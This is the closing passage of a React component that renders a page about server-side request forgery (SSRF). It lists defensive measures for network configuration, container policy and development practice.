                <li><strong>Security Group Configuration:</strong> Restrict outbound connections at network level</li>
                <li><strong>VPC Configuration:</strong> Use private subnets and NAT gateways for controlled internet access</li>
                <li><strong>Container Security:</strong> Implement network policies in Kubernetes environments</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Development and Testing</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Environment Isolation:</strong> Separate development, staging, and production networks</li>
                <li><strong>Mock Services:</strong> Use mock external services during development</li>
                <li><strong>Security Testing:</strong> Include SSRF testing in automated security scans</li>
                <li><strong>Code Review:</strong> Review all code making external HTTP requests</li>
                <li><strong>Dependency Management:</strong> Keep HTTP client libraries updated</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default SSRF;
